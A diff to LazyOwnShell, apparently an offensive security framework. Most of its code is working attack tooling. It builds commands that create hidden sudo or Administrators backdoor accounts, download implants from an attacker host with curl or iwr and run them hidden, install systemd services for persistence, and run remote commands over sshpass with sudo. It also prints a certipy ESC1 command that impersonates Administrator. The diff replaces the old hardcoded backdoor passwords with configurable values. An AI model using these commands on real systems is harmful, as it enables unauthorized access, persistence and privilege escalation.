@@ -370,8 +370,13 @@ class LazyOwnShell(cmd2.Cmd):
             "c2_user": c2_user,
             "c2_pass": c2_pass,
             "enable_c2_implant_debug": True,
-            "start_user": "grisun0",
-            "start_pass": "grisgrisgris",
+            "start_user": "CHANGE_ME",
+            "start_pass": "CHANGE_ME",
+            "backdoor_username": "CHANGE_ME",
+            "backdoor_password": "CHANGE_ME",
+            "backdoor_linux_home": "/home/.lazyown",
+            "backdoor_win_home": "C:/Users/lazyown/Documents",
+            "backdoor_win_service_path": "C:/Users/lazyown/Documents",
             "rhost": rhost,
             "lhost": lhost,
             "scope": LazyOwnShell.scope,
@@ -390,7 +395,7 @@ class LazyOwnShell(cmd2.Cmd):
             "url_trafic_1" : "https://www.google-analytics.com/collect?v=1&_v=j81&a=123456789&t=pageview&_s=1&dl=https%3A%2F%2Fexample.com%2F&ul=en-us&de=UTF-8&dt=Example%20Page",
             "url_trafic_2" : "https://api.azure.com/v1/status?client_id=123456789&region=us-east-1",
             "url_trafic_3" : "https://www.youtube.com/watch?v=1i0shWLFfuI&list=PLW9Qe5HJK5CFXyIsF9b0NB6n9EY8Am3YZ",
-            "rat_key": "82e672ae054aa4de6f042c888111686a",
+            "rat_key": "CHANGE_ME",
             "startip": "192.168.1.1",
             "endip": "192.168.1.254",
             "spoof_ip": "185.199.110.153",
@@ -8827,10 +8832,11 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(persistence_category)
     def do_grisun0(self, line):
         """
-        Creates and copies a shell command to add a new user `grisun0`, assign a password, add the user to the sudo group, and switch to the user.
+        Creates and copies a shell command to add a new user, assign a password, add the user to the sudo group, and switch to the user.
+        Uses backdoor_username, backdoor_password, and backdoor_linux_home from payload.json.
 
         1. Displays the command:
-            - Prints the command to add the user `grisun0` with home directory `/home/.grisun0`, assign the password, add the user to the `sudo` group, assign the appropriate permissions, and switch to the user.
+            - Prints the command to add the user with the configured home directory, assign the password, add the user to the `sudo` group, assign the appropriate permissions, and switch to the user.
 
         2. Copies the command to clipboard:
             - Uses `xclip` to copy the command to the clipboard for easy pasting.
@@ -8842,22 +8848,38 @@ class LazyOwnShell(cmd2.Cmd):
         Manual execution:
         To manually execute the command:
         - Copy the command from the clipboard.
-        - Run it in a terminal to create the user and assign up the permissions as specified. useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0
+        - Run it in a terminal to create the user and assign up the permissions as specified.
         Note: Ensure `xclip` is installed and available on your system.
         """
+        username = self.params.get("backdoor_username", "CHANGE_ME")
+        password = self.params.get("backdoor_password", "CHANGE_ME")
+        home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
 
-        print_msg("printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
-        os.system("printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && sudo usermod -aG sudo grisun0 && su - grisun0\" | xclip -sel clip")
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("backdoor_username and backdoor_password must be set in payload.json")
+            return
+
+        cmd = (
+            f"useradd -m -d {home_dir} -s /bin/bash {username} && "
+            f"echo '{username}:{password}' | chpasswd && "
+            f"usermod -aG sudo {username} && "
+            f"chmod 700 {home_dir} && "
+            f"sudo usermod -aG sudo {username} && "
+            f"su - {username}"
+        )
+        print_msg(f"printf \"{cmd}\" | xclip -sel clip")
+        os.system(f"printf \"{cmd}\" | xclip -sel clip")
         print_warn("Copied to clip ;)")
         return
 
     @cmd2.with_category(persistence_category)
     def do_grisun0w(self, line):
         """
-        Creates and copies a PowerShell command to add a new user `grisun0`, assign a password, add the user to the Administrators group, and switch to the user.
+        Creates and copies a PowerShell command to add a new user, assign a password, add the user to the Administrators group, and switch to the user.
+        Uses backdoor_username and backdoor_password from payload.json.
 
         1. Displays the command:
-            - Prints the PowerShell command to add the user `grisun0`, assign the password, add the user to the `Administrators` group, and switch to the user.
+            - Prints the PowerShell command to add the user, assign the password, add the user to the `Administrators` group, and switch to the user.
 
         2. Copies the command to clipboard:
             - Uses `clip` to copy the command to the clipboard for easy pasting.
@@ -8871,16 +8893,23 @@ class LazyOwnShell(cmd2.Cmd):
         - Copy the command from the clipboard.
         - Run it in a PowerShell terminal to create the user and assign the permissions as specified.
         """
+        username = self.params.get("backdoor_username", "CHANGE_ME")
+        password = self.params.get("backdoor_password", "CHANGE_ME")
+
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("backdoor_username and backdoor_password must be set in payload.json")
+            return
+
         command = (
-            "powershell $userExists = Get-LocalUser -Name 'grisun0' -ErrorAction SilentlyContinue; "
-            "if ($userExists) { Write-Output 'User grisun0 already exists.' } else { "
-            "$password = 'Grisgrisgris123!'; "
-            "$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
-            "New-LocalUser -Name 'grisun0' -Password $securePassword -FullName 'Grisun0 User' -Description 'Grisun0 User'; }; "
-            "$group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; "
-            "if ($group) { Add-LocalGroupMember -Group 'Administrators' -Member 'grisun0' } else { Write-Output 'Group Administrators was not found.' }; "
-            "Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \\\"/C runas /user:grisun0 cmd.exe\\\"`\"' ; "
-            "net localgroup administrators grisun0 /add"
+            f"powershell $userExists = Get-LocalUser -Name '{username}' -ErrorAction SilentlyContinue; "
+            f"if ($userExists) {{ Write-Output 'User {username} already exists.' }} else {{ "
+            f"$password = '{password}'; "
+            f"$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; "
+            f"New-LocalUser -Name '{username}' -Password $securePassword -FullName '{username} User' -Description '{username} User'; }}; "
+            f"$group = Get-LocalGroup -Name 'Administrators' -ErrorAction SilentlyContinue; "
+            f"if ($group) {{ Add-LocalGroupMember -Group 'Administrators' -Member '{username}' }} else {{ Write-Output 'Group Administrators was not found.' }}; "
+            f"Start-Process powershell -Verb runAs -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command `\"Start-Process cmd.exe -Verb runAs -ArgumentList \\\"/C runas /user:{username} cmd.exe\\\"`\"' ; "
+            f"net localgroup administrators {username} /add"
         )
 
         copy2clip(command)
@@ -18961,17 +18990,19 @@ class LazyOwnShell(cmd2.Cmd):
             return
 
         extension = ".sh" if test_scripts[0].endswith(".sh") else ".ps1"
+        win_drop_path = self.params.get("backdoor_win_service_path", "C:/Users/lazyown/Documents")
+        win_atomic_path = f"{win_drop_path}/lazyown_atomic_test"
         if extension == ".sh":
             atomic_agent_content = "\n".join([f"/bin/sh {os.path.join(tmp_path, os.path.basename(script))}" for script in test_scripts])
         else:
-            atomic_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts])
+            atomic_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/{os.path.basename(script)}' -Verb RunAs" for script in test_scripts])
         atomic_agent_path = os.path.join(tmp_path, f"atomic_agent{extension}")
         with open(atomic_agent_path, "w") as f:
             f.write(atomic_agent_content)
         if extension == ".sh":
             atomic_clean_agent_content = "\n".join([f"/bin/bash {os.path.join(tmp_path, os.path.basename(script))}" for script in clean_test_scripts])
         else:
-            atomic_clean_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/{os.path.basename(script)}' -Verb RunAs" for script in clean_test_scripts])
+            atomic_clean_agent_content = "\n".join([f"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/{os.path.basename(script)}' -Verb RunAs" for script in clean_test_scripts])
         atomic_clean_agent_path = os.path.join(tmp_path, f"atomic_clean_agent{extension}")
         with open(atomic_clean_agent_path, "w") as f:
             f.write(atomic_clean_agent_content)
@@ -18995,11 +19026,12 @@ class LazyOwnShell(cmd2.Cmd):
                     password = self.params.get("password") or input("    [!] Enter the password: ")
 
         rhost = self.params["rhost"]
+        sudo_pass = self.params.get("start_pass", "CHANGE_ME")
         print_msg("Deploying agent.")
         if extension == ".sh":
-            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh'"
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"{sudo_pass}\" | sudo -S /tmp/lazyown_atomic_test/atomic_agent.sh'"
         else:
-            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_agent.ps1' -Verb RunAs\""
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:{win_drop_path}/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/atomic_agent.ps1' -Verb RunAs\""
 
         exit_code = self.cmd(rsync_command)
         if line.startswith("web"):
@@ -19007,9 +19039,9 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             input("    [!] Press enter to clean Red Operation: ")
         if extension == ".sh":
-            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"grisgrisgris\" | sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh'"
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/tmp/lazyown_atomic_test && sshpass -p '{password}' ssh {username}@{rhost} 'cd /tmp/lazyown_atomic_test/ && chmod +x /tmp/lazyown_atomic_test/* && echo \"{sudo_pass}\" | sudo -S /tmp/lazyown_atomic_test/atomic_clean_agent.sh'"
         else:
-            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', 'C:/Users/grisun0/Documents/lazyown_atomic_test/atomic_clean_agent.ps1' -Verb RunAs\""
+            rsync_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:{win_drop_path}/ && sshpass -p '{password}' ssh {username}@{rhost} powershell.exe -Command \"Start-Process powershell.exe -ArgumentList '-File', '{win_atomic_path}/atomic_clean_agent.ps1' -Verb RunAs\""
 
 
         exit_code = self.cmd(rsync_command)
@@ -19019,7 +19051,7 @@ class LazyOwnShell(cmd2.Cmd):
         if extension == ".sh":
             scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:{log_path} {sessions_path}/"
         else:
-            scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:C:/Users/grisun0/Documents/lazyown_atomic_test/*.log {sessions_path}/"
+            scp_command = f"sshpass -p '{password}' scp {username}@{rhost}:{win_atomic_path}/*.log {sessions_path}/"
         self.cmd(scp_command)
 
         if exit_code == 0:
@@ -21533,9 +21565,11 @@ class LazyOwnShell(cmd2.Cmd):
                 target_os = "lin"
 
         if target_os == "win":
-            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:C:/Users/grisun0/Documents/ "
+            win_drop = self.params.get("backdoor_win_home", "C:/Users/lazyown/Documents")
+            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:{win_drop}/ "
         else:
-            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:/home/.grisun0"
+            lin_drop = self.params.get("backdoor_linux_home", "/home/.lazyown")
+            scp_command = f"sshpass -p '{password}' scp -r {tmp_path}/ {username}@{rhost}:{lin_drop}"
 
         print_msg(scp_command)
         self.cmd(scp_command)
@@ -22062,7 +22096,7 @@ class LazyOwnShell(cmd2.Cmd):
     @cmd2.with_category(post_exploitation_category)
     def do_ssh_cmd(self, line):
         """
-        Perform Remote Execution Command trow ssh using grisun0 user, see help grisun0
+        Perform Remote Execution Command through SSH using configured start_user. See help grisun0 for backdoor user configuration.
 
         Parameters:
             line (str): The command line input, is the command to execute, if not presented is whoami
@@ -22073,8 +22107,11 @@ class LazyOwnShell(cmd2.Cmd):
         if not line:
             line = "whoami"
         rhost = self.params["rhost"]
-        username = "grisun0"
-        password = "grisgrisgris"
+        username = self.params.get("start_user", "CHANGE_ME")
+        password = self.params.get("start_pass", "CHANGE_ME")
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("start_user and start_pass must be configured in payload.json")
+            return
         print_msg(f"Executing ... {line}")
         ssh = f"""sshpass -p '{password}' ssh {username}@{rhost} 'echo "{password}" | sudo -S {line}'"""
         self.cmd(ssh)
@@ -22206,7 +22243,8 @@ class LazyOwnShell(cmd2.Cmd):
         lhost = self.params["lhost"]
         implant_go2 = f"l_{line}_l.exe"
         if choice == "2":
-            command = f"curl -o /home/grisun0/l_{line} http://{lhost}/l_{line} && sudo -S chmod +x /home/grisun0/l_{line} && sudo -S nohup /home/grisun0/l_{line} & \\n"
+            home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
+            command = f"curl -o {home_dir}/l_{line} http://{lhost}/l_{line} && sudo -S chmod +x {home_dir}/l_{line} && sudo -S nohup {home_dir}/l_{line} & \\n"
         else:
             command = f"Start-Process powershell -ArgumentList \"-NoProfile -WindowStyle Hidden -Command `\"iwr -uri  http://{lhost}/{implant_go2} -OutFile {implant_go2} ; .\\{implant_go2}`\"\""
 
@@ -22273,7 +22311,8 @@ class LazyOwnShell(cmd2.Cmd):
         lhost = self.params["lhost"]
 
         if choice == "2":
-            command = f"curl -o /home/.grisun0/l_{line}.sh http://{lhost}/listener_{line}.sh && sudo -S chmod +x /home/.grisun0/l_{line}.sh && sudo -S nohup /bin/bash /home/.grisun0/l_{line}.sh & \\n"
+            home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
+            command = f"curl -o {home_dir}/l_{line}.sh http://{lhost}/listener_{line}.sh && sudo -S chmod +x {home_dir}/l_{line}.sh && sudo -S nohup /bin/bash {home_dir}/l_{line}.sh & \\n"
         else:
             command = f"Start-Process powershell -ArgumentList \"curl -o l_{line}.sh http://{lhost}/listener_{line}.sh ; chmod +x l_{line}.sh ; ./l_{line}.sh &\""
 
@@ -22371,7 +22410,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("No binary name provided.")
             return
 
-        default_path = f"/home/.grisun0/services/{binary_name}"
+        home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
+        default_path = f"{home_dir}/services/{binary_name}"
         binary_path = default_path if not os.path.isabs(binary_name) else binary_name
 
         service_content = f"""#!/bin/bash
@@ -22383,7 +22423,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         [Service]
         ExecStart={binary_path}
-        WorkingDirectory=/home/.grisun0/services
+        WorkingDirectory={home_dir}/services
         StandardOutput=inherit
         StandardError=inherit
         Restart=always
@@ -22408,7 +22448,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Failed to create service file: {e}")
             return
 
-        password = 'grisgrisgris'
+        password = self.params.get("start_pass", "CHANGE_ME")
         cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
         print_msg("Run the following command to enable and start the service:")
         self.onecmd(f"ssh_cmd {cmd}")
@@ -22441,7 +22481,8 @@ class LazyOwnShell(cmd2.Cmd):
             print_error("No binary name provided.")
             return
 
-        default_path = f"/home/.grisun0/services/{binary_name}"
+        home_dir = self.params.get("backdoor_linux_home", "/home/.lazyown")
+        default_path = f"{home_dir}/services/{binary_name}"
         binary_path = default_path if not os.path.isabs(binary_name) else binary_name
 
         service_content = f"""#!/bin/bash
@@ -22453,7 +22494,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         [Service]
         ExecStart={binary_path}
-        WorkingDirectory=/home/.grisun0/services
+        WorkingDirectory={home_dir}/services
         StandardOutput=inherit
         StandardError=inherit
         Restart=always
@@ -22478,7 +22519,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Failed to create service file: {e}")
             return
 
-        password = 'grisgrisgris'
+        password = self.params.get("start_pass", "CHANGE_ME")
         cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
         print_msg(f"Run the following command to enable and start the service: {cmd}")
 
@@ -22812,8 +22853,11 @@ class LazyOwnShell(cmd2.Cmd):
             command = f"cd {sessions} && wget -O {name} --header='Accept: application/gzip' {self.url_download}"
             self.cmd(command)
         command_remote = f"wget -O {name} http://{lhost}/{name}"
-        username = "grisun0"
-        password = "grisgrisgris"
+        username = self.params.get("start_user", "CHANGE_ME")
+        password = self.params.get("start_pass", "CHANGE_ME")
+        if username == "CHANGE_ME" or password == "CHANGE_ME":
+            print_error("start_user and start_pass must be configured in payload.json")
+            return
         ssh = f"""sshpass -p '{password}' ssh {username}@{rhost} '
         mkdir -p {tmp} ;
         cd {tmp} ;
@@ -23994,6 +24038,196 @@ class LazyOwnShell(cmd2.Cmd):
         dropFile(KEY,ciphertext)
         self.display_toastr(f"The files cipher.bin and key.bin are witchcrafted in sessions directory for the file: {exe}", type="info")
         return
+
+    @cmd2.with_category(post_exploitation_category)
+    def do_yara_scan(self, line):
+        """Scan files or directories with YARA rules for malware/IOCs.
+
+        Usage: yara_scan <target_path> [--download-rules]
+
+        Scans the target path with default LazyOwn YARA rules covering
+        webshells, Cobalt Strike, reverse shells, credential theft, and
+        persistence mechanisms.  Auto-installs yara-python if missing.
+        """
+        args = line.strip().split()
+        if not args:
+            print_error("Usage: yara_scan <target_path> [--download-rules]")
+            return
+
+        target = args[0]
+        download_rules = '--download-rules' in args
+
+        if not os.path.exists(target):
+            print_error(f"Target not found: {target}")
+            return
+
+        try:
+            import yara as _yara
+        except ImportError:
+            self.display_toastr("yara-python not found. Installing...", type="warning")
+            self.cmd(f"{sys.executable} -m pip install yara-python --quiet")
+            try:
+                import yara as _yara
+            except ImportError:
+                self.display_toastr("yara-python installation failed. Aborting.", type="error")
+                return
+
+        from modules.yara_scanner import YaraScanner, create_default_rules
+
+        scanner = YaraScanner(auto_compile=False)
+
+        if download_rules:
+            print_msg("Downloading community YARA rules...")
+            scanner.download_community_rules()
+
+        print_msg("Compiling default YARA rules...")
+        create_default_rules()
+        scanner.compile_all()
+
+        if scanner.rule_count == 0:
+            print_error("No YARA rules loaded.")
+            return
+
+        print_msg(f"Scanning with {scanner.rule_count} rules...")
+
+        if os.path.isfile(target):
+            results = scanner.scan_file(target)
+            if results:
+                for match in results:
+                    print_msg(f"  Rule: {match.get('rule', '?')}")
+                    print_msg(f"  Tags: {match.get('tags', [])}")
+                    if 'meta' in match:
+                        for k, v in match['meta'].items():
+                            print_msg(f"  {k}: {v}")
+                    print_msg("---")
+            else:
+                print_msg("No matches found.")
+        else:
+            results = scanner.scan_directory(target)
+            for file_result in results:
+                print_msg(f"\nFile: {file_result['file']}")
+                print_msg(f"  SHA256: {file_result['sha256']}")
+                for match in file_result.get('matches', []):
+                    print_msg(f"  Rule: {match.get('rule', '?')}")
+                    print_msg(f"  Tags: {match.get('tags', [])}")
+            if not results:
+                print_msg("No matches found.")
+
+        print_msg(f"\nScanned {len(results)} matches across target.")
+
+    @cmd2.with_category(scanning_category)
+    def do_cloud_enum(self, line):
+        """Enumerate cloud provider metadata, storage, and IAM.
+
+        Usage: cloud_enum [provider]
+        Providers: aws, azure, gcp (auto-detect if omitted)
+
+        Performs full enumeration including IMDS metadata extraction,
+        storage bucket listing, IAM role enumeration, and privilege
+        escalation path detection.  Auto-installs dependencies if missing.
+        """
+        provider = line.strip() or 'auto'
+        if provider not in ('aws', 'azure', 'gcp', 'auto'):
+            print_error("Provider must be: aws, azure, gcp, or auto")
+            return
+
+        try:
+            import requests as _requests
+        except ImportError:
+            self.display_toastr("requests not found. Installing...", type="warning")
+            self.cmd(f"{sys.executable} -m pip install requests --quiet")
+
+        from modules.cloud_enum import CloudEnumerator
+
+        enumerator = CloudEnumerator(provider=provider)
+        detected = enumerator.detect_provider()
+        print_msg(f"Detected provider: {detected or 'None'}")
+
+        if not detected and provider == 'auto':
+            print_warn("No cloud provider detected. Are you on a cloud instance?")
+            return
+
+        print_msg("Enumerating metadata...")
+        metadata = enumerator.enumerate_metadata()
+        for key, value in metadata.items():
+            if isinstance(value, dict):
+                print_msg(f"  {key}:")
+                for k, v in value.items():
+                    if 'token' in k.lower() or 'key' in k.lower() or 'secret' in k.lower():
+                        v = str(v)[:30] + '...[redacted]'
+                    print_msg(f"    {k}: {v}")
+            else:
+                if 'token' in key.lower() or 'key' in key.lower() or 'secret' in key.lower():
+                    value = str(value)[:30] + '...[redacted]'
+                print_msg(f"  {key}: {value}")
+
+        print_msg("Enumerating storage...")
+        storage = enumerator.enumerate_storage()
+        for bucket in storage:
+            print_msg(f"  {bucket}")
+
+        print_msg("Enumerating IAM...")
+        iam = enumerator.enumerate_iam()
+        for section, data in iam.items():
+            print_msg(f"  {section}: {len(data) if isinstance(data, list) else 'present'}")
+
+        print_msg("Enumeration complete.")
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_adcs_check(self, line):
+        """Check Active Directory Certificate Services for ESC1-ESC8 vulnerabilities.
+
+        Usage: adcs_check <username> <password> <domain> <dc_ip>
+
+        Enumerates certificate templates and maps them to applicable
+        ESC attack techniques. Uses Certipy under the hood.
+        Auto-installs certipy-ad if missing.
+        """
+        args = line.strip().split()
+        if len(args) < 4:
+            print_error("Usage: adcs_check <username> <password> <domain> <dc_ip> [ntlm_hash]")
+            return
+
+        username = args[0]
+        password = args[1]
+        domain = args[2]
+        dc_ip = args[3]
+        hashes = args[4] if len(args) > 4 else None
+
+        if not is_binary_present("certipy") and not is_binary_present("certipy-ad"):
+            self.display_toastr("certipy-ad not found. Installing...", type="warning")
+            self.cmd(f"{sys.executable} -m pip install certipy-ad --quiet")
+            if not is_binary_present("certipy") and not is_binary_present("certipy-ad"):
+                self.display_toastr("certipy-ad installation failed. Aborting.", type="error")
+                return
+
+        from modules.adcs_attacks import ADCSCertipyWrapper, _ESC_DESCRIPTIONS, _ESC_EXPLOITATION
+
+        wrapper = ADCSCertipyWrapper()
+        print_msg(f"Assessing AD CS for domain: {domain}")
+
+        results = wrapper.assess_vulnerability(username, password, domain, dc_ip, hashes)
+
+        total_vulnerabilities = 0
+        for esc_id, vulns in sorted(results.items()):
+            if vulns:
+                total_vulnerabilities += len(vulns)
+                print_msg(f"\n[{esc_id}] {_ESC_DESCRIPTIONS.get(esc_id, '')}")
+                for vuln in vulns:
+                    print_msg(f"  Template: {vuln.get('template_name', vuln.get('ca_name', '?'))}")
+                    print_msg(f"  CA: {vuln.get('ca_name', '?')}")
+                    exploitation = _ESC_EXPLOITATION.get(esc_id, '')
+                    if exploitation:
+                        print_msg(f"  Exploit: {exploitation}")
+                if esc_id == 'ESC1' and vulns:
+                    print_msg(f"\n  Run exploit with:")
+                    print_msg(f"  certipy req -u {username}@{domain} -p '{password}' -dc-ip {dc_ip} -ca <CA_NAME> -template <TEMPLATE_NAME> -upn Administrator@{domain}")
+
+        if total_vulnerabilities == 0:
+            print_msg("No AD CS vulnerabilities detected.")
+        else:
+            print_msg(f"\nTotal vulnerable configurations: {total_vulnerabilities}")
+
 
 def main():
     if HEADLESS:
